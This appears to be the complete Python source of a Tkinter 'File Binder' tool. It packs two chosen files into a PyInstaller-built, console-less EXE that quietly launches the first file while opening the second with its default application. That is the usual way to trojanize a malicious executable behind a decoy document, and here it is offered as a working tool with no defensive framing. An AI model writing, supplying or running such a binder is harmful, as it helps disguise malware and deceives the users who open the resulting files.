import os
import base64
import zipfile
import tempfile
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox
import shutil

def select_file(entry_widget):
    file_path = filedialog.askopenfilename()
    if file_path:
        entry_widget.delete(0, tk.END)
        entry_widget.insert(0, file_path)

def bind_files():
    file1 = entry_file1.get()
    file2 = entry_file2.get()
    
    if not file1 or not file2:
        messagebox.showerror("Error", "Please select both files!")
        return
    
    if not os.path.exists(file1) or not os.path.exists(file2):
        messagebox.showerror("Error", "One or both files do not exist!")
        return
    
    # Create a temporary ZIP file
    with tempfile.NamedTemporaryFile(delete=False, suffix=".zip") as tmp_zip:
        with zipfile.ZipFile(tmp_zip.name, 'w') as zipf:
            zipf.write(file1, os.path.basename(file1))
            zipf.write(file2, os.path.basename(file2))
    
    # Convert ZIP to base64
    with open(tmp_zip.name, 'rb') as f:
        zip_data = base64.b64encode(f.read()).decode('utf-8')
    
    # Generate the extractor script
    extractor_script = f'''
import os
import base64
import zipfile
import tempfile
import subprocess

ZIP_DATA = "{zip_data}"

# Extract files
with tempfile.NamedTemporaryFile(delete=False, suffix=".zip") as tmp_zip:
    tmp_zip.write(base64.b64decode(ZIP_DATA.encode('utf-8')))
    tmp_zip.close()
    with zipfile.ZipFile(tmp_zip.name, 'r') as zipf:
        zipf.extractall(".")

# Run the first file (original EXE)
subprocess.Popen("{os.path.basename(file1)}", shell=True)

# Open the second file with default app
os.startfile("{os.path.basename(file2)}")

os.unlink(tmp_zip.name)  # Clean up
'''
    
    # Save extractor script
    with open("extractor.py", 'w') as f:
        f.write(extractor_script)
    
    # Compile extractor.py to EXE (same name as first file)
    output_exe = os.path.basename(file1)
    subprocess.run(
        f'pyinstaller --onefile --noconsole extractor.py -n {output_exe}',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Cleanup
    os.remove(tmp_zip.name)
    shutil.rmtree("build", ignore_errors=True)
    os.remove("extractor.py")
    if os.path.exists("extractor.spec"):
        os.remove("extractor.spec")
    
    messagebox.showinfo("Success", f"Created {output_exe}!\nRun it to launch both files.")

# GUI Setup
root = tk.Tk()
root.title("File Binder")
root.geometry("500x250")

# File 1 Selection
tk.Label(root, text="First File (Output EXE):").pack(pady=5)
entry_file1 = tk.Entry(root, width=50)
entry_file1.pack(pady=5)
tk.Button(root, text="Browse", command=lambda: select_file(entry_file1)).pack(pady=5)

# File 2 Selection
tk.Label(root, text="Second File (Auto-Open):").pack(pady=5)
entry_file2 = tk.Entry(root, width=50)
entry_file2.pack(pady=5)
tk.Button(root, text="Browse", command=lambda: select_file(entry_file2)).pack(pady=5)

# Bind Button
tk.Button(root, text="Bind Files", command=bind_files, bg="green", fg="white").pack(pady=20)

root.mainloop()